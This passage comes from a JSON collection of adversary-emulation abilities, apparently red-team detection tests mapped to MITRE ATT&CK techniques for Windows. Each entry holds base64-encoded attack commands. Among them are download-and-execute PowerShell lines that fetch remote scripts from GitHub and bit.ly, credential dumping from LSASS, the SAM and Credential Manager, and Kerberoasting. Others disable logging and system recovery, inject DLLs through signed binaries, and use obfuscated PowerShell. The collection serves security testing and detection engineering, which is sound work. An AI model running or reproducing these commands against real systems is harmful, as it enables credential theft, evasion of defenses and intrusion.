"SUVYIChJV1IgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9za2FyNDQ0NC9XaW5kb3dzLUNyZWRlbnRpYWwtTWFuYWdlci80YWQyMDhlNzBjODBkZDJhOTk2MWRiNDA3OTNkYTI5MWIxOTgxZTAxL0dldENyZWRtYW5DcmVkcy5wczEnIC1Vc2VCYXNpY1BhcnNpbmcpOyBHZXQtUGFzc3dvcmRWYXVsdENyZWRlbnRpYWxzIC1Gb3JjZQ==", "ability_id": "d74777514cba5a4fd4f297261ed0d8ef", "technique_name": "Credentials from Password Stores", "additional_info": {}, "privilege": "", "technique_id": "T1555", "platform": "windows", "name": "Dump credentials from Windows Credential Manager With PowerShell [windows Credentials]", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "This module will extract the credentials from Windows Credential Manager", "variations": []}, {"test": "a2xpc3QgcHVyZ2U7IGNtZC5leGUgL2MgIiRFbnY6dGVtcFxydWJldXMuZXhlIiBrZXJiZXJvYXN0IE5vbmUgL291dGZpbGU6IiRFbnY6dGVtcFxydWJldXNfb3V0cHV0LnR4dCI=", "ability_id": "db4a49a1257b08a9e9afc0c221818402", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.003", "platform": "windows", "name": "Rubeus kerberoast", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJEVudjp0ZW1wXHJ1YmV1c19vdXRwdXQudHh0IC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLENvbnRyb2xfUnVuRExMIDYzNDljMF9jYWxjLmRsbA==", "ability_id": "64d35e2efbcef92f6c54b4a5c01ef2e2", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Rundll32 with Control_RunDLL", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["6349c0_calc.dll"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n", "variations": []}, {"test": "QzpcV2luZG93c1xzeXN0ZW0zMlxyZWdzdnIzMi5leGUgL3MgL2kgYmFmZGYzX0FsbFRoZVRoaW5nc3g4Ni5kbGw=", "ability_id": "0626f22d8f8d0902d69088cac33d80cb", "technique_name": "Signed Binary Proxy Execution: Regsvr32", "additional_info": {}, "privilege": "", "technique_id": "T1218.010", "platform": "windows", "name": "Regsvr32 Silent DLL Install Call DllRegisterServer", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["bafdf3_AllTheThingsx86.dll"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.", "variations": []}, {"test": "ZXZpbC13aW5ybSAtaSBUYXJnZXQgLXUgRG9tYWluXEFkbWluaXN0cmF0b3IgLXAgUEBzc3cwcmQx", "ability_id": "c51dc4d1537961d9a3d9afe6654905c9", "technique_name": "Remote Services: Windows Remote Management", "additional_info": {}, "privilege": "", "technique_id": "T1021.006", "platform": "windows", "name": "WinRM Access with Evil-WinRM", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled", "variations": []}, {"test": "cG93ZXJzaGVsbC5leGUgLWUgIEpnQWdBQ2dBWndCakFHMEFJQUFvQUNjQWFRQmxBSHNBTUFCOUFDY0FJQUF0QUdZQUlBQW5BSGdBSndBcEFDa0FJQUFvQUNJQVZ3QnlBQ0lBS3dBaUFHa0FkQUFpQUNzQUlnQmxBQzBBU0FBaUFDc0FJZ0J2QUhNQWRBQWdBQ2NBU0FBaUFDc0FJZ0JsQUd3QUlnQXJBQ0lBYkFCdkFDd0FJQUJtQUhJQUlnQXJBQ0lBYndCdEFDQUFVQUFpQUNzQUlnQnZBSGNBSWdBckFDSUFaUUJ5QUZNQUlnQXJBQ0lBYUFBaUFDc0FJZ0JsQUd3QWJBQWhBQ2NBSWdBcEFBPT0=", "ability_id": "ae9ef01b8b55a7001139255811ba1d4f", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "PowerShell Command Execution", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n", "variations": []}, {"test": "cnVuZGxsMzIuZXhlIHBjd3V0bC5kbGwsTGF1bmNoQXBwbGljYXRpb24gJXdpbmRpciVcU3lzdGVtMzJcbm90ZXBhZC5leGU=", "ability_id": "ca23e384b06ab9ccb5069d103a206657", "technique_name": "Signed Binary Proxy Execution: Rundll32", "additional_info": {}, "privilege": "", "technique_id": "T1218.011", "platform": "windows", "name": "Launches an executable using Rundll32 and pcwutl.dll", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n", "variations": []}, {"test": "JHBvcnRzID0gR2V0LWNvbnRlbnQgODhhMTRkX3RvcC0xMjgudHh0OyAkZmlsZSA9ICIkZW52OlVTRVJQUk9GSUxFXERlc2t0b3Bcb3Blbi1wb3J0cy50eHQiOyAkdG90YWxvcGVuID0gMDsgJHRvdGFscG9ydHMgPSAwOyBOZXctSXRlbSAkZmlsZSAtRm9yY2U7IGZvcmVhY2ggKCRwb3J0IGluICRwb3J0cykgezsgICAgICR0ZXN0ID0gbmV3LW9iamVjdCBzeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50OyAgICAgJHdhaXQgPSAkdGVzdC5iZWdpbkNvbm5lY3QoImFsbHBvcnRzLmV4cG9zZWQiLCAkcG9ydCwgJG51bGwsICRudWxsKTsgICAgICR3YWl0LmFzeW5jd2FpdGhhbmRsZS53YWl0b25lKDI1MCwgJGZhbHNlKSB8IE91dC1OdWxsOyAgICAgJHRvdGFscG9ydHMrKyB8IE91dC1OdWxsOyAgICAgaWYgKCR0ZXN0LkNvbm5lY3RlZCkgezsgICAgICAgICAkcmVzdWx0ID0gIiRwb3J0IG9wZW4iIDsgICAgICAgICBXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4gJHJlc3VsdDsgICAgICAgICAkcmVzdWx0IHwgT3V0LUZpbGUgLUVuY29kaW5nIEFTQ0lJIC1hcHBlbmQgJGZpbGU7ICAgICAgICAgJHRvdGFsb3BlbisrIHwgT3V0LU51bGw7ICAgICB9OyAgICAgZWxzZSB7OyAgICAgICAgICRyZXN1bHQgPSAiJHBvcnQgY2xvc2VkIiA7ICAgICAgICAgV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAkcmVzdWx0OyAgICAgICAgICR0b3RhbGNsb3NlZCsrIHwgT3V0LU51bGw7ICAgICAgICAgJHJlc3VsdCB8IE91dC1GaWxlIC1FbmNvZGluZyBBU0NJSSAtYXBwZW5kICRmaWxlOyAgICAgfTsgfTsgJHJlc3VsdHMgPSAiVGhlcmUgd2VyZSBhIHRvdGFsIG9mICR0b3RhbG9wZW4gb3BlbiBwb3J0cyBvdXQgb2YgJHRvdGFscG9ydHMgcG9ydHMgdGVzdGVkLiI7ICRyZXN1bHRzIHwgT3V0LUZpbGUgLUVuY29kaW5nIEFTQ0lJIC1hcHBlbmQgJGZpbGU7IFdyaXRlLUhvc3QgJHJlc3VsdHM=", "ability_id": "1d46ffd997d1722c5b26b7b1db282454", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "List Open Egress Ports", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["88a14d_top-128.txt"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUVycm9yQWN0aW9uIGlnbm9yZSAiJGVudjpVU0VSUFJPRklMRVxEZXNrdG9wXG9wZW4tcG9ydHMudHh0Ig==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI4OGExNGRfdG9wLTEyOC50eHQi"], "executor": "psh", "access": {}, "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n", "variations": []}, {"test": "QzpcV2luZG93c1xTeXN0ZW0zMlxpbmV0c3J2XGFwcGNtZC5leGUgc2V0IGNvbmZpZyAiRGVmYXVsdCBXZWIgU2l0ZSIgL3NlY3Rpb246aHR0cGxvZ2dpbmcgL2RvbnRMb2c6dHJ1ZQ==", "ability_id": "621c016fb5abf544cbf0f72a7e48fa23", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Disable Windows IIS HTTP Logging", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["aWYoVGVzdC1QYXRoICJDOlxXaW5kb3dzXFN5c3RlbTMyXGluZXRzcnZcYXBwY21kLmV4ZSIpezsgICBDOlxXaW5kb3dzXFN5c3RlbTMyXGluZXRzcnZcYXBwY21kLmV4ZSBzZXQgY29uZmlnICJEZWZhdWx0IFdlYiBTaXRlIiAvc2VjdGlvbjpodHRwbG9nZ2luZyAvZG9udExvZzpmYWxzZSAqPiRudWxsOyB9"], "executor": "psh", "access": {}, "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n", "variations": []}, {"test": "YmNkZWRpdC5leGUgL3NldCB7ZGVmYXVsdH0gYm9vdHN0YXR1c3BvbGljeSBpZ25vcmVhbGxmYWlsdXJlcyAmJiBiY2RlZGl0LmV4ZSAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgbm8=", "ability_id": "8467c994685ccf178db166964bd80fab", "technique_name": "Inhibit System Recovery", "additional_info": {}, "privilege": "", "technique_id": "T1490", "platform": "windows", "name": "Windows - Disable Windows Recovery Console Repair", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["YmNkZWRpdC5leGUgL3NldCB7ZGVmYXVsdH0gYm9vdHN0YXR1c3BvbGljeSBEaXNwbGF5QWxsRmFpbHVyZXMgPm51bCAyPiYxICYmIGJjZGVkaXQuZXhlIC9zZXQge2RlZmF1bHR9IHJlY292ZXJ5ZW5hYmxlZCB5ZXMgPm51bCAyPiYx"], "executor": "cmd", "access": {}, "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n", "variations": []}, {"test": "c2h1dGRvd24gL3IgL3QgMQ==", "ability_id": "a5ca8ff6820e584c96bd331127235911", "technique_name": "System Shutdown/Reboot", "additional_info": {}, "privilege": "", "technique_id": "T1529", "platform": "windows", "name": "Restart System - Windows", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test restarts a Windows system.\n", "variations": []}, {"test": "MTIwMTFjX0FkRmluZC5leGUgLWYgKG9iamVjdGNhdGVnb3J5PXBlcnNvbik=", "ability_id": "c333d7d59cf97a6353cbd5af72703780", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Adfind - Enumerate Active Directory User Objects", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["12011c_AdFind.exe"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "cmVnLmV4ZSBhZGQgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXGNhbGNzZXJ2aWNlIiAvZiAvdiBJbWFnZVBhdGggL2QgIiV3aW5kaXIlXHN5c3RlbTMyXGNtZC5leGUi", "ability_id": "72249c1e9ffe7d8f30243d838e0791ca", "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness", "additional_info": {}, "privilege": "", "technique_id": "T1574.011", "platform": "windows", "name": "Service ImagePath Change with reg.exe", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["c2MuZXhlIGRlbGV0ZSBjYWxjc2VydmljZQ=="], "executor": "cmd", "access": {}, "description": "Change Service registry ImagePath of a bengin service to a malicious file\n", "variations": []}, {"test": "KFthZHNpc2VhcmNoZXJdIm9iamVjdGNhdGVnb3J5PWdyb3VwIikuRmluZEFsbCgpOyAoW2Fkc2lzZWFyY2hlcl0ib2JqZWN0Y2F0ZWdvcnk9Z3JvdXAiKS5GaW5kT25lKCk=", "ability_id": "b45cb08e24877077d98421393bce079a", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Enumerate Active Directory Groups with ADSISearcher", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTU2Mi4wMDJcYmluXFBoYW50MG0uZXhl", "ability_id": "6edbb64c4badd39db25498943b515b7f", "technique_name": "Impair Defenses: Disable Windows Event Logging", "additional_info": {}, "privilege": "", "technique_id": "T1562.002", "platform": "windows", "name": "Makes Eventlog blind with Phant0m", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZWNobyAiU29ycnkgeW91IGhhdmUgdG8gcmVib290Ig=="], "executor": "cmd", "access": {}, "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n", "variations": []}, {"test": "d21pYyAvbm9kZToiMTI3LjAuMC4xIiBwcm9kdWN0IHdoZXJlICJuYW1lIGxpa2UgJ1RpZ2h0dm5jJSUnIiBjYWxsIHVuaW5zdGFsbA==", "ability_id": "ac122553ab4426ea3362bb4a97d31bfd", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "Application uninstall using WMIC", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["bXNpZXhlYyAvaSBQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDQ3XGJpblx0aWdodHZuY2luc3RhbGxlci5tc2kgL3FuIC9ub3Jlc3RhcnQ="], "executor": "cmd", "access": {}, "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.", "variations": []}, {"test": "V3JpdGUtSG9zdCAiU1RBUlRJTkcgVE8gU0VUIEJZUEFTUyBhbmQgRElTQUJMRSBERUZFTkRFUiBSRUFMVElNRSBNT04iIC1mb3JlIGdyZWVuOyBTZXQtRXhlY3V0aW9uUG9saWN5IC1TY29wZSBDdXJyZW50VXNlciAtRXhlY3V0aW9uUG9saWN5IFJlbW90ZVNpZ25lZCAtRXJyb3JBY3Rpb24gSWdub3JlOyBJbnZva2UtV2VicmVxdWVzdCAtVXJpICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkMtU0VDVVJJVFkvRW1waXJlL2MxYmRiZDBmZGFmZDViZjM0NzYwZDViMTU4ZGZkMGRiMmJiMTk1NTYvZGF0YS9tb2R1bGVfc291cmNlL2NyZWRlbnRpYWxzL0ludm9rZS1Qb3dlckR1bXAucHMxIiAtVXNlQmFzaWNQYXJzaW5nIC1PdXRGaWxlICIkRW52OlRlbXBcUG93ZXJEdW1wLnBzMSI7IEltcG9ydC1Nb2R1bGUgIiRFbnY6VGVtcFxQb3dlckR1bXAucHMxIjsgSW52b2tlLVBvd2VyRHVtcA==", "ability_id": "72cfaaef67bb113a633a3c9bbf7d9fe0", "technique_name": "OS Credential Dumping: Security Account Manager", "additional_info": {}, "privilege": "", "technique_id": "T1003.002", "platform": "windows", "name": "PowerDump Registry dump of SAM for hashes and usernames", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a hashdump by reading the hasshes from the registry.", "variations": []}, {"test": "QzpcV2luZG93c1xTeXNXb3c2NFxSZWdpc3Rlci1DaW1Qcm92aWRlci5leGUgLVBhdGggI3tkbGxfcGF5bG9hZH0=", "ability_id": "19cc7bd7b3019bc8c28a43016c922203", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "Register-CimProvider - Execute evil dll", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n", "variations": []}, {"test": "bmV0IHVzZXIgI3tkb21haW4udXNlci5uYW1lfSAvZG9tYWlu", "ability_id": "364ea817-bbb9-4083-87dd-94b9dba45f6f", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Account Discovery (targeted)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The net utility is executed via cmd to enumerate detailed information about a specific user account.", "variations": []}, {"test": "KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwOi8vYml0Lmx5L0wzZzF0Q3JhZDFlJywnRGVmYXVsdF9GaWxlX1BhdGgucHMxJyk7SUVYKCgtSm9pbihbSU8uRmlsZV06OlJlYWRBbGxCeXRlcygnRGVmYXVsdF9GaWxlX1BhdGgucHMxJyl8Rm9yRWFjaC1PYmplY3R7W0NoYXJdJF99KSkpOyAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly9iaXQubHkvTDNnMXRDcmFkMWUnLCdEZWZhdWx0X0ZpbGVfUGF0aC5wczEnKTtbU2NyaXB0QmxvY2tdOjpDcmVhdGUoKC1Kb2luKFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCdEZWZhdWx0X0ZpbGVfUGF0aC5wczEnKXxGb3JFYWNoLU9iamVjdHtbQ2hhcl0kX30pKSkuSW52b2tlUmV0dXJuQXNJcygpOyBTZXQtVmFyaWFibGUgSEoxICdodHRwOi8vYml0Lmx5L0wzZzF0Q3JhZDFlJztTSSBWYXJpYWJsZTovMFcgJ05ldC5XZWJDbGllbnQnO1NldC1JdGVtIFZhcmlhYmxlOlxnSCAnRGVmYXVsdF9GaWxlX1BhdGgucHMxJztscyBfLSo7U2V0LVZhcmlhYmxlIGlnWiAoLiRFeGVjdXRpb25Db250ZXh0Lkludm9rZUNvbW1hbmQuKCgkRXhlY3V0aW9uQ29udGV4dC5JbnZva2VDb21tYW5kLlBzT2JqZWN0Lk1ldGhvZHN8P3skXy5OYW1lLWxpa2UnKkNtKnQnfSkuTmFtZSkuSW52b2tlKCRFeGVjdXRpb25Db250ZXh0Lkludm9rZUNvbW1hbmQuKCgkRXhlY3V0aW9uQ29udGV4dC5JbnZva2VDb21tYW5kfEdNfD97JF8uTmFtZS1saWtlJypvbSplJ30pLk5hbWUpLkludm9rZSgnKnctKmN0JywkVFJVRSwxKSkoR2V0LUNoaWxkSXRlbSBWYXJpYWJsZTowVykuVmFsdWUpO1NldC1WYXJpYWJsZSBKICgoKChHZXQtVmFyaWFibGUgaWdaIC1WYWx1ZU9uKXxHTSl8P3skXy5OYW1lLWxpa2UnKncqaSpsZSd9KS5OYW1lKTsoR2V0LVZhcmlhYmxlIGlnWiAtVmFsdWVPbikuKChDaGlsZEl0ZW0gVmFyaWFibGU6SikuVmFsdWUpLkludm9rZSgoR2V0LUl0ZW0gVmFyaWFibGU6L0hKMSkuVmFsdWUsKEdWIGdIKS5WYWx1ZSk7JiggJycuSXNOb3JtYWxpemVkLlRvU3RyaW5nKClbMTMsMTUsNDhdLUpvaW4nJykoLUpvaW4oW0NoYXJbXV0oQ0FUIC1FbmNvIDMgKEdWIGdIKS5WYWx1ZSkpKQ==", "ability_id": "ef943918da20ee40d378ad000bbcc3b7", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Obfuscation Tests", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xMYW5tYW5TZXJ2ZXJcUGFyYW1ldGVycyIgL3YgQXV0b1NoYXJlU2VydmVyIC90IFJFR19EV09SRCAvZCAwIC9mICYmIHJlZyBhZGQgIkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcTGFubWFuU2VydmVyXFBhcmFtZXRlcnMiIC92IEF1dG9TaGFyZVdrcyAvdCBSRUdfRFdPUkQgL2QgMCAvZg==", "ability_id": "1f91076e2be2014cc7b4f1296de02fd6", "technique_name": "Indicator Removal on Host: Network Share Connection Removal", "additional_info": {}, "privilege": "", "technique_id": "T1070.005", "platform": "windows", "name": "Disable Administrative Share Creation at Startup", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xMYW5tYW5TZXJ2ZXJcUGFyYW1ldGVycyIgL3YgQXV0b1NoYXJlU2VydmVyIC9mICYmIHJlZyBkZWxldGUgIkhLRVlfTE9DQUxfTUFDSElORVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcTGFubWFuU2VydmVyXFBhcmFtZXRlcnMiIC92IEF1dG9TaGFyZVdrcyAvZg=="], "executor": "cmd", "access": {}, "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled and is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTAwMy4wMDFcYmluXHByb2NkdW1wLmV4ZSAtYWNjZXB0ZXVsYSAtbW0gbHNhc3MuZXhlIEM6XFdpbmRvd3NcVGVtcFxsc2Fzc19kdW1wLmRtcA==", "ability_id": "bd7780db67f42278033b765eb1c5de55", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Create Mini Dump of LSASS.exe using ProcDump", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsICJDOlxXaW5kb3dzXFRlbXBcbHNhc3NfZHVtcC5kbXAiID5udWwgMj4gbnVs"], "executor": "cmd", "access": {}, "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n", "variations": []}, {"test": "bmV0IGFjY291bnRzIC9kb21haW4=", "ability_id": "38f6f0e50a6b196140ec40d3dc9cc9e6", "technique_name": "Password Policy Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1201", "platform": "windows", "name": "Examine domain password policy - Windows", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Lists the domain password policy to console on Windows.\n", "variations": []}, {"test": "UG93ZXJzaGVsbC5leGUgIklFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VuaWdtYTB4My9NaXNjLVBvd2VyU2hlbGwtU3R1ZmYvYTBkZmNhNzA1NmVmMjAyOTViMTU2YjgyMDc0ODBkYzI0NjVmOTRjMy9JbnZva2UtQXBwUGF0aEJ5cGFzcy5wczEnKTsgSW52b2tlLUFwcFBhdGhCeXBhc3MgLVBheWxvYWQgJ0M6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSci", "ability_id": "d56753da33c882128773634140c0efa5", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "Invoke-AppPathBypass", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n", "variations": []}, {"test": "Y21kLmV4ZSAvUSAvYyBob3N0bmFtZSAxPiBcXDEyNy4wLjAuMVxBRE1JTiRcb3V0cHV0LnR4dCAyPiYx", "ability_id": "34020258ec67d5ceaaa6ad892639e69d", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Execute command writing output to local Admin Share", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Executes a command, writing the output to a local Admin Share.\nThis technique is used by post-exploitation frameworks.\n", "variations": []}, {"test": "I3thZGZpbmRfcGF0aH0gLWYgKG9iamVjdGNhdGVnb3J5PWdyb3VwKQ==", "ability_id": "311063ce2db4fca31b5ceafa6a501dd8", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Adfind - Query Active Directory Groups", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n", "variations": []}, {"test": "bWF2aW5qZWN0LmV4ZSAje3Byb2Nlc3NfaWR9IC9JTkpFQ1RSVU5OSU5HICN7ZGxsX3BheWxvYWR9", "ability_id": "fb72bea779b1152cad1c4aa74dfb189a", "technique_name": "Signed Binary Proxy Execution", "additional_info": {}, "privilege": "", "technique_id": "T1218", "platform": "windows", "name": "mavinject - Inject DLL into running process", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], 